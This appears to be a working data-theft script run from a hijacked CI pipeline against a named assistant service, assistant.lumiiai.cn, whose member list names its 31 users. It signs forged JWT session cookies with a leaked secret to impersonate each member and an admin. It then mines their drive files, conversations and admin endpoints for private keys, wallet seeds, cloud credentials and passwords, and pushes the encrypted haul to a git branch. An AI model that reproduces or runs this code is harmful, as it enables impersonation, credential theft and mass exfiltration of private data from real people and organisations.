#!/usr/bin/env python3
# probe2 (intent 28120): FULL data-plane mining of assistant.lumiiai.cn drive.
# - enumerate all 31 members' drive trees -> all nodes
# - download ALL text files < 512KB (parallel), grep for secrets in-runner
# - fetch all conversation messages (all convs), grep
# - enumerate control-plane read endpoints with forged admin/org session
# Runs inside GitHub Actions runner via package.json postinstall (hijacked deploy.yml).
import os, sys, json, time, uuid, base64, hmac, hashlib, socket, subprocess, ssl, shutil, threading, traceback, re
import concurrent.futures as cf
import urllib.request, urllib.error, urllib.parse as up
import http.client

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
START = time.time()
BUDGET = int(os.environ.get("PBUDGET", "3300"))

TARGET_IP = "122.51.1.87"
HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"

OUT = "/tmp/results2"
for d in ("hits", "admin", "convhits", "cp", "rawgz", "msggz"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass

MEMBERS = {
 "usr_j7t9Dhq4M4obQkag5huJi":"吴海贤(Brian)","usr_CMU92C54VpuSAXoCfbXDE":"徐魁东",
 "usr_2gzZoKLgRAYaFNy2Sav4v":"路峰","usr_SjEcavSzyWqWKeokUwig4":"梅宇祥",
 "usr_ZxLewKrgbRYSm7rWDtQX8":"管理员","usr_J29JW7MJRtMJfXe2cruEq":"李雅娟",
 "usr_h84uYNEaLgbdrcGFRGRis":"Alex Yan","usr_fJUE3VqiyFrqrJzAjq6Qc":"王劦",
 "usr_KSQogo9RMCDvYPzgebFZ9":"杨魁","usr_3HNamBngy2Xfwm4T3tzMJ":"周子博",
 "usr_JqvejphBd2cFVLWZQmtnZ":"菠萝","usr_HhQysrVvW2uhNbyMfgT5D":"Cathy",
 "usr_xahbQ7FZR4NAMztJFbDJS":"刘禹衡","usr_wcgceRDUAJsMFPfQgVgHc":"Tim",
 "usr_tqnzWEgcPdPMUguyD5PKm":"Ben Zhu","usr_etAuXiJB7UYPmqtqEh5Pv":"Mark",
 "usr_5MTDkxB65hVucKyfxUaMe":"E2E测试","usr_gQZHAztNodEAy8GCY9YEg":"牟总",
 "usr_4Ya9zoJ6ckEe9b77Ev7NS":"lumii_test","usr_HXQCzMVo79Z65gPcAqk33":"演示·产发部",
 "usr_8jFriEhWmpZv77ApNrsPX":"演示·集团领导","usr_krVGWCZF2uMYQba6hLT3r":"演示·盛青",
 "usr_f5aLpRa9uHTdXC8hWP2ag":"演示·鹏城","usr_QjRMrRJnFN9BLdujE8Q4J":"演示·盈港",
 "usr_pesN8T7K6RwVfNQeoakMw":"演示·湖区","usr_mMMqdtDuyWzh6b5y9YinE":"演示·企服",
 "usr_WVN3ZNSJT4HMwsGgFxhCE":"Joyce","usr_w3nRZpmKCZNGDgFDUvHjA":"桑东堂",
 "usr_XLBCd82JGQAbt5pttnfAw":"牟柯屹","usr_pgnckdUSgpk9iDW3WemFY":"测试账号",
 "usr_8WTmpJ5gAdAXJdTAAgfcs":"王棱",
}
PRIORITY = ["usr_ZxLewKrgbRYSm7rWDtQX8","usr_j7t9Dhq4M4obQkag5huJi",
            "usr_CMU92C54VpuSAXoCfbXDE","usr_2gzZoKLgRAYaFNy2Sav4v"]
ORDER = PRIORITY + [k for k in MEMBERS if k not in PRIORITY]

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')))
    p = b64u(json.dumps({"sub":sub,"org":ORG,"iat":now,"exp":now+2592000,
                         "sid":"sid_"+str(uuid.uuid4()),"lgn":now}, separators=(',',':')))
    sig = hmac.new(JWT_SECRET.encode(), (h+"."+p).encode(), hashlib.sha256).digest()
    return "lumii_session="+h+"."+p+"."+b64u(sig)
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
_ck = {}
def cookie(sub):
    if sub not in _ck: _ck[sub] = jwt(sub)
    return _ck[sub]
_tl = threading.local()
def _conn(timeout=25):
    c = getattr(_tl, "c", None)
    if c is None:
        c = http.client.HTTPSConnection(HOST, 443, timeout=timeout, context=CTX)
        _tl.c = c
    return c
def req(sub, path, method="GET", data=None, timeout=25, retries=2):
    headers = {"Cookie": cookie(sub), "Accept":"*/*", "User-Agent":"Mozilla/5.0",
               "Connection":"keep-alive"}
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    last = (-1, {}, b"")
    for i in range(retries+1):
        c = None
        try:
            c = _conn(timeout)
            c.request(method, path, body=body, headers=headers)
            resp = c.getresponse()
            b = resp.read()
            hd = {}
            for k, v in resp.getheaders():
                hd[k] = v
            if resp.status == 0:
                raise Exception("status0")
            return resp.status, hd, b
        except Exception as e:
            last = (-1, {}, ("ERR:"+repr(e)).encode())
            try:
                if c is not None: c.close()
            except Exception: pass
            try: _tl.c = None
            except Exception: pass
            time.sleep(0.3*(i+1))
    return last
def jget(sub, path, **kw):
    st, hd, b = req(sub, path, **kw)
    try: j = json.loads(b)
    except Exception: j = None
    return st, j, b, hd

def sanitize(name, mid=""):
    s = re.sub(r'[^A-Za-z0-9._-]+', '_', str(name or ""))[:90]
    return (s or "x") + "_" + str(mid)[-8:]

RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-fast-28120-results")
def _unlink(p):
    try:
        if os.path.isfile(p): os.remove(p)
    except Exception:
        pass
def push_results(final=False):
    enc = "/tmp/results2.tar.gz.gpg"
    try:
        _unlink("/tmp/results2.tar.gz"); _unlink(enc); _unlink("results2.tar.gz.gpg")
        subprocess.run("tar czf /tmp/results2.tar.gz -C /tmp results2", shell=True, check=False)
        tsize = os.path.getsize("/tmp/results2.tar.gz") if os.path.isfile("/tmp/results2.tar.gz") else 0
        log("TARBALL size", tsize)
        if tsize == 0: return
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results2.tar.gz"%enc,
                           shell=True, capture_output=True, text=True, timeout=300)
        if os.path.isfile(enc):
            esz = os.path.getsize(enc); data = open(enc,"rb").read()
            sha = hashlib.sha256(data).hexdigest()
            log("ENC size", esz, "sha256", sha)
            if esz >= 95*1024*1024:
                log("full too big, rebuilding compact (exclude rawgz/msggz)")
                try:
                    subprocess.run("tar czf /tmp/results2.tar.gz --exclude='results2/rawgz' --exclude='results2/msggz' -C /tmp results2", shell=True, check=False)
                    subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results2.tar.gz"%enc, shell=True, capture_output=True, text=True, timeout=300)
                    esz = os.path.getsize(enc); data=open(enc,"rb").read(); sha=hashlib.sha256(data).hexdigest(); log("COMPACT ENC",esz,sha)
                except Exception as e:
                    log("compact rebuild EXC", repr(e))
            if esz < 95*1024*1024:
                shutil.copy(enc, "results2.tar.gz.gpg")
                subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
                subprocess.run("git add -f results2.tar.gz.gpg && git commit -m 'ci results2 %s %s'||true"%(RUNID, "final" if final else "part"),
                               shell=True, check=False)
                r = subprocess.run("git push -f origin HEAD:refs/heads/%s"%RESULT_BRANCH,
                                   shell=True, capture_output=True, text=True, timeout=600)
                log("PUSH rc=%s err=%s"%(r.returncode,(r.stderr or "")[-300:]))
            else:
                log("TOO BIG to push:", esz)
    except Exception as e:
        log("PUSH EXC", repr(e))

# ---------- secret patterns ----------
PATTERNS = [
 ("evm_privkey", r'\b0x[0-9a-fA-F]{64}\b'),
 ("pem_privkey", r'-----BEGIN (?:RSA |EC |OPENSSH |ENCRYPTED |DSA |PGP )?PRIVATE KEY-----'),
 ("ssh_privkey_openssh", r'-----BEGIN OPENSSH PRIVATE KEY-----'),
 ("deployer_key_assign", r'(?i)(DEPLOYER_PRIVATE_KEY|DEPLOY[_A-Z]*PRIVATE|PRIVATE_KEY\s*[:=]\s*[\'"]?0x[0-9a-fA-F]{40,})'),
 ("mnemonic_assign", r'(?i)(mnemonic|seed[_ ]?phrase|secret[_ ]?phrase)\s*[:=]'),
 ("wallet_secret_assign", r'(?i)(WALLET_PRIVATE|X402[A-Z_]*PRIVATE|GAS_RELAYER[A-Z_]*PRIVATE|SPONSOR[A-Z_]*PRIVATE|PAYMENT[A-Z_]*PRIVATE)'),
 ("pg_dsn", r'(?i)(postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp)://[^\s"\'<>]{6,}'),
 ("aws_ak", r'\b(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AKID[0-9A-Za-z]{13,})\b'),
 ("aws_sk_assign", r'(?i)(aws_secret_access_key|secret_access_key|secretKey|SecretKey|COS_SECRET|TENCENT[A-Z_]*SECRET)\s*[:=]\s*[\'"]?[A-Za-z0-9/+=]{20,}'),
 ("gcp_sa", r'"type"\s*:\s*"service_account"'),
 ("jwt_hmac_secret", r'(?i)(JWT_SECRET|JWT_KEY|HMAC_SECRET|SESSION_SECRET|COOKIE_SECRET|LUMII_DESKTOP_TOKEN_SECRET)\s*[:=]\s*[\'"]?[0-9a-zA-Z_\-]{16,}'),
 ("auth_zoofi", r'(?i)Auth for zoofi'),
 ("zoofi_index_origin", r'(?i)(zoofi[-_]?index|trycloudflare\.com|cloudflared|\.zoofi\.io|api\.zoofi\.io|zoofi\.io/api)'),
 ("db_password", r'(?i)(DB_PASS|DATABASE_URL|DB_PASSWORD|PGPASSWORD|POSTGRES_PASSWORD|REDIS_PASSWORD|password)\s*[:=]\s*[\'"]?[^\s\'"<>]{6,}'),
 ("api_key_rpc", r'(?i)(ALCHEMY|INFURA|QUICKNODE|RPC_URL|0G_?API|ZEROG|API_KEY|APIKEY|OPENAI_API_KEY|STORY_API)\s*[:=]\s*[\'"]?[A-Za-z0-9_\-]{16,}'),
 ("cf_token", r'(?i)(CF_API_TOKEN|CLOUDFLARE_API_TOKEN|CLOUDFLARE_TOKEN)\s*[:=]'),
 ("metamask_vault", r'(?i)(vault|keyring|MetaMask|mmv_0|\"salt\"|\"cipherparams\"|PBKDF2)'),
 ("github_token", r'\b(gh[pous]_[0-9A-Za-z]{30,}|github_pat_[0-9A-Za-z_]{20,})\b'),
 ("known_eoa", r'0x(?:C56f[0-9a-fA-F]{36}|FE18[0-9a-fA-F]{36})'),
 ("internal_hostport", r'\b(?:10|127|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}(?::\d{2,5})\b'),
 ("tz_tencent_secret", r'(?i)(secretId|secretKey|SecretId|SecretKey)\s*[:=]\s*[\'"]?[A-Za-z0-9]{10,}'),
]
PATS = [(n, re.compile(r)) for n, r in PATTERNS]
def scan(text):
    if not text: return []
    out = []
    for name, rx in PATS:
        ms = list(rx.finditer(text))
        if ms:
            snips = []
            for m in ms[:4]:
                a = max(0, m.start()-50); b = min(len(text), m.end()+50)
                snips.append(text[a:b].replace("\n"," "))
            out.append({"name":name,"count":len(ms),"snips":snips})
    return out

all_nodes = {}
node_user = {}
def add_nodes(j, sub):
    if isinstance(j, dict):
        for key in ("nodes","notes","files","items","data"):
            arr = j.get(key)
            if isinstance(arr, list):
                for n in arr:
                    if isinstance(n, dict) and n.get("id"):
                        all_nodes.setdefault(n["id"], n)
                        node_user.setdefault(n["id"], [])
                        if sub not in node_user[n["id"]]: node_user[n["id"]].append(sub)
    elif isinstance(j, list):
        for n in j:
            if isinstance(n, dict) and n.get("id"):
                all_nodes.setdefault(n["id"], n)
                node_user.setdefault(n["id"], [])
                if sub not in node_user[n["id"]]: node_user[n["id"]].append(sub)

def fetch_raw(sub, nid):
    for path in ("/api/drive/%s/raw"%nid, "/api/drive/%s/content?download=1"%nid,
                 "/api/drive/%s/download"%nid, "/api/files/%s/raw"%nid, "/api/drive/node/%s/raw"%nid):
        st, j, b, hd = jget(sub, path)
        low = b[:200].lower()
        if st == 200 and len(b) > 0 and not b.startswith(b'{"error') and b'<html' not in low and b'<!doctype' not in low:
            return b, hd.get("Content-Type",""), path
    return None

BINEXT = {"png","jpg","jpeg","gif","webp","ico","bmp","tif","tiff","pdf","docx","doc","pptx","ppt","xlsx","xls",
          "zip","rar","7z","gz","tgz","tar","dwg","mp3","m4a","wav","mp4","mov","avi","woff","woff2","ttf","otf",
          "eot","exe","dll","so","bin","apk","ipa","psd","ai","sketch"}
def ext_of(name):
    m = re.search(r'\.([A-Za-z0-9]{1,12})$', name or "")
    return m.group(1).lower() if m else ""
def is_text_name(name):
    e = ext_of(name)
    return e not in BINEXT

def _get(u, timeout=20):
    try:
        with urllib.request.urlopen(urllib.request.Request(u), timeout=timeout, context=CTX) as r:
            return r.status, r.read()
    except Exception as e:
        return -1, ("ERR:"+repr(e)).encode()

def discover_endpoints():
    eps = set()
    try:
        st, b = _get("https://%s/" % HOST)
        html = b.decode('utf-8','replace')
        assets = re.findall(r'/assets/[A-Za-z0-9._\-]+\.js', html) + re.findall(r'src="([^"]+\.js)"', html)
        log("index html assets:", assets[:10])
        for a in assets[:4]:
            u = a if a.startswith("http") else "https://%s%s" % (HOST, a)
            st, js = _get(u)
            if st == 200:
                t = js.decode('utf-8','replace')
                for m in re.finditer(r'["\'`](/api/[A-Za-z0-9_\-/{}$:.]+)["\'`]', t):
                    eps.add(m.group(1))
                for m in re.finditer(r'conversations/[^"\'`]{0,40}(messages|timeline|list)', t):
                    eps.add("HITMSG:"+m.group(0))
        json.dump(sorted(eps), open(os.path.join(OUT,"api_endpoints.json"),"w"), ensure_ascii=False, indent=1)
        log("discovered api eps count", len(eps))
    except Exception as e:
        log("discover err", repr(e))
    return eps

def main():
    summary = {"target":TARGET_IP,"host":HOST,"ts":int(time.time()),"runid":RUNID}
    st, hd, b = req(ORDER[0], "/")
    log("GET / ->", st, "len", len(b))
    summary["root"] = {"status":st,"len":len(b)}
    if st == -1:
        log("TARGET UNREACHABLE"); json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), indent=1)
        push_results(final=True); return

    eps = discover_endpoints()

    # Phase 1: enumerate nodes
    users_sum = {}
    for sub in ORDER:
        us = {"name":MEMBERS.get(sub,sub)}
        for label, path in (("tree","/api/drive/tree?hidden=1"),("drive","/api/drive?hidden=1")):
            st, j, bb, hd = jget(sub, path)
            us[label] = st
            if j is not None:
                add_nodes(j, sub)
        users_sum[sub] = us
    summary["users"] = users_sum
    log("TOTAL nodes", len(all_nodes))
    agg = []
    for nid, n in all_nodes.items():
        nn = dict(n); nn["_users"] = node_user.get(nid, []); agg.append(nn)
    json.dump(agg, open(os.path.join(OUT,"all_nodes.json"),"w"), ensure_ascii=False)
    del agg

    # build target file list
    targets = []
    for nid, n in all_nodes.items():
        if n.get("kind") not in ("file","doc","note","attachment"): continue
        nm = n.get("name") or ""
        if not is_text_name(nm): continue
        try: size = int(n["size"]) if n.get("size") is not None else None
        except Exception: size = None
        if size is not None and (size <= 0 or size > 512*1024): continue
        targets.append((nid, n, size))
    log("text target files:", len(targets))

    KW = re.compile(r'(deploy|secret|key|env|db|config|ssh|prod|vault|wallet|passw|token|cred|\.sql|zoofi|qimei|dump|backup|\.pem|\.log|\.ldb|mongo|postgres|redis|\.tf|\.ya?ml)', re.I)
    def prio_key(item):
        nid, n, size = item
        nm = n.get("name") or ""
        admin = "usr_ZxLewKrgbRYSm7rWDtQX8" in node_user.get(nid, [])
        kw = bool(KW.search(nm))
        return (0 if admin else 1, 0 if kw else 1, size if size is not None else 0)
    targets.sort(key=prio_key)

    index = []
    lock = threading.Lock()
    hit_count = [0]
    raw_saved = [0]
    RAW_CAP = int(os.environ.get("RAW_CAP","20000000"))

    def work(item):
        nid, n, size = item
        if time.time()-START > BUDGET-300: return ("skip","timebudget")
        subs = node_user.get(nid) or [ORDER[0]]
        sub = subs[0]
        try:
            res = fetch_raw(sub, nid)
            if not res:
                for s2 in subs[1:3]:
                    res = fetch_raw(s2, nid)
                    if res: break
            if not res:
                with lock: index.append({"id":nid,"name":n.get("name"),"size":size,"owner":n.get("ownerId"),"ok":False})
                return ("fail",None)
            raw, ctype, used = res
            try: txt = raw.decode('utf-8','replace')
            except Exception: txt = raw.decode('latin-1','replace')
            hits = scan(txt)
            sha = hashlib.sha256(raw).hexdigest()
            admin = "usr_ZxLewKrgbRYSm7rWDtQX8" in node_user.get(nid, [])
            entry = {"id":nid,"name":n.get("name"),"size":len(raw),"owner":n.get("ownerId"),
                     "users":node_user.get(nid,[]),"ctype":ctype,"path":used,"sha256":sha,
                     "matches":[h["name"] for h in hits],"admin":admin}
            with lock:
                index.append(entry)
                if hits:
                    hit_count[0]+=1
                    fn = sanitize(n.get("name"), nid)+".txt"
                    open(os.path.join(OUT,"hits",fn),"w",encoding='utf-8',errors='replace').write(txt)
                    with open(os.path.join(OUT,"hits_report.jsonl"),"a",encoding='utf-8') as f:
                        f.write(json.dumps({"file":fn,"id":nid,"name":n.get("name"),"owner":n.get("ownerId"),
                                            "users":node_user.get(nid,[]),"matches":hits}, ensure_ascii=False)+"\n")
                if admin:
                    fn = sanitize(n.get("name"), nid)+".txt"
                    open(os.path.join(OUT,"admin",fn),"w",encoding='utf-8',errors='replace').write(txt)
                if raw_saved[0] < RAW_CAP and len(raw) > 0:
                    with open(os.path.join(OUT,"rawgz","f_%s.txt"%nid),"wb") as f:
                        f.write(raw)
                    raw_saved[0]+=len(raw)
            return ("ok",hits)
        except Exception as e:
            with lock: index.append({"id":nid,"name":n.get("name"),"size":size,"ok":False,"err":repr(e)[:120]})
            return ("exc",repr(e))

    done = 0
    with cf.ThreadPoolExecutor(max_workers=16) as ex:
        futs = {ex.submit(work, it): it for it in targets}
        for fu in cf.as_completed(futs):
            done += 1
            if done % 2000 == 0:
                log("downloaded", done, "/", len(targets), "hits", hit_count[0], "rawMB", round(raw_saved[0]/1e6,1), "t", round(time.time()-START))
            if time.time()-START > BUDGET-300:
                log("time budget in file phase, cancelling rest"); break
    log("file phase done dl", done, "hits", hit_count[0], "rawMB", round(raw_saved[0]/1e6,1))
    json.dump(index, open(os.path.join(OUT,"index.json"),"w"), ensure_ascii=False)
    summary["files"] = {"targets":len(targets),"done":done,"hits":hit_count[0],"raw_bytes":raw_saved[0]}
    json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
    push_results(final=False)

    # Phase 2: conversations + messages
    convs = {}
    for sub in ORDER:
        st, j, bb, hd = jget(sub, "/api/conversations")
        if isinstance(j, dict):
            arr = j.get("conversations") or j.get("items") or j.get("nodes") or []
            if isinstance(arr, list):
                for c in arr:
                    if isinstance(c, dict) and c.get("id"):
                        convs.setdefault(c["id"], c)
                        convs[c["id"]].setdefault("_subs", [])
                        if sub not in convs[c["id"]]["_subs"]: convs[c["id"]]["_subs"].append(sub)
    log("conversations total", len(convs))
    summary["conversations"] = len(convs)
    json.dump([{"id":k,"title":v.get("title"),"kind":v.get("kind"),"lastMessage":v.get("lastMessage"),
                "lastMessageAt":v.get("lastMessageAt"),"subs":v.get("_subs")} for k,v in convs.items()],
              open(os.path.join(OUT,"convs_index.json"),"w"), ensure_ascii=False)

    def extract_strings(o, acc):
        if isinstance(o, str): acc.append(o)
        elif isinstance(o, dict):
            for v in o.values(): extract_strings(v, acc)
        elif isinstance(o, list):
            for v in o: extract_strings(v, acc)

    MSG_ENDPOINTS = [
        "/api/conversations/%s/messages?limit=1000",
        "/api/conversations/%s/messages",
        "/api/conversations/%s/timeline?limit=1000",
        "/api/messages?conversationId=%s&limit=1000",
        "/api/conversations/%s/message-list",
    ]
    for e in sorted(eps):
        if e.startswith("HITMSG:"): continue
        if "messages" in e and "$" in e:
            MSG_ENDPOINTS.insert(0, e.replace("$","%s"))
    msg_index = []
    msg_hit = [0]; msg_saved = [0]; MSG_CAP = int(os.environ.get("MSG_CAP","80000000"))

    def get_messages(cid, c):
        subs = c.get("_subs") or [ORDER[0]]
        for sub in subs[:3]:
            for ep in MSG_ENDPOINTS:
                try:
                    path = ep % cid
                except Exception:
                    continue
                st, j, bb, hd = jget(sub, path, timeout=25, retries=1)
                if st == 200 and j is not None:
                    arr = j if isinstance(j, list) else (j.get("messages") or j.get("items") or j.get("data") or j.get("nodes"))
                    if isinstance(arr, list):
                        return arr, path, j
        return None, None, None

    def work_conv(kv):
        cid, c = kv
        if time.time()-START > BUDGET-200: return
        try:
            arr, used, rawj = get_messages(cid, c)
            if arr is None:
                with lock: msg_index.append({"id":cid,"title":c.get("title"),"ok":False})
                return
            acc = []; extract_strings(arr, acc)
            blob = "\n".join(acc)
            hits = scan(blob)
            with lock:
                msg_index.append({"id":cid,"title":c.get("title"),"ok":True,"nmsg":len(arr),"path":used,
                                  "matches":[h["name"] for h in hits]})
                if hits:
                    msg_hit[0]+=1
                    open(os.path.join(OUT,"convhits","%s.json"%cid),"w",encoding='utf-8',errors='replace').write(
                        json.dumps({"id":cid,"title":c.get("title"),"path":used,"messages_raw":rawj,
                                    "matches":hits}, ensure_ascii=False))
                if msg_saved[0] < MSG_CAP:
                    open(os.path.join(OUT,"msggz","%s.json"%cid),"w",encoding='utf-8',errors='replace').write(
                        json.dumps({"id":cid,"title":c.get("title"),"nmsg":len(arr),"messages":arr}, ensure_ascii=False))
                    msg_saved[0] += len(blob)
        except Exception as e:
            with lock: msg_index.append({"id":cid,"ok":False,"err":repr(e)[:120]})

    done_c = 0
    with cf.ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(work_conv, kv): kv for kv in convs.items()}
        for fu in cf.as_completed(futs):
            done_c += 1
            if done_c % 100 == 0:
                log("conv", done_c, "/", len(convs), "hits", msg_hit[0], "savedMB", round(msg_saved[0]/1e6,1), "t", round(time.time()-START))
            if time.time()-START > BUDGET-200:
                log("time budget in conv phase"); break
    json.dump(msg_index, open(os.path.join(OUT,"messages_index.json"),"w"), ensure_ascii=False)
    summary["messages"] = {"convs":len(convs),"done":done_c,"hit_convs":msg_hit[0],"saved_bytes":msg_saved[0]}
    log("conv phase done", done_c, "hits", msg_hit[0])
    json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
    push_results(final=False)

    # Phase 3: control plane read endpoints
    cp_targets = ["/api/orgs","/api/org","/api/users","/api/users/me","/api/me","/api/account",
                  "/api/devices","/api/tokens","/api/secrets","/api/admin","/api/admin/users",
                  "/api/admin/orgs","/api/admin/tokens","/api/admin/secrets","/api/admin/config",
                  "/api/org/config","/api/org/members","/api/settings","/api/admin/settings",
                  "/api/integrations","/api/app-tokens","/api/api-keys","/api/keys"]
    cp_res = {}
    cp_subs = ["usr_ZxLewKrgbRYSm7rWDtQX8", "usr_j7t9Dhq4M4obQkag5huJi", ORG]
    for sub in cp_subs:
        for t in cp_targets:
            st, j, bb, hd = jget(sub, t, timeout=15, retries=1)
            key = "%s|%s"%(sub,t)
            if st != 404:
                cp_res[key] = {"status":st,"len":len(bb),"body":(j if j is not None else bb[:2000].decode('utf-8','replace'))}
                fn = sanitize(t.replace("/","_"), sub)
                try: json.dump(cp_res[key], open(os.path.join(OUT,"cp","cp_%s.json"%fn),"w"), ensure_ascii=False)
                except Exception: pass
    json.dump(cp_res, open(os.path.join(OUT,"controlplane.json"),"w"), ensure_ascii=False)
    log("control-plane probed", len(cp_res), "non-404")
    summary["controlplane"] = {k:v["status"] for k,v in cp_res.items()}

    json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
    log("DONE")
    push_results(final=True)

def _wd():
    while True:
        time.sleep(5)
        if time.time()-START > BUDGET:
            log("WATCHDOG timeout; dumping partial")
            try: push_results(final=True)
            except Exception: pass
            os._exit(1)
threading.Thread(target=_wd, daemon=True).start()

try:
    main()
except Exception:
    log("FATAL", traceback.format_exc())
    try: push_results(final=True)
    except Exception: pass
sys.exit(1)
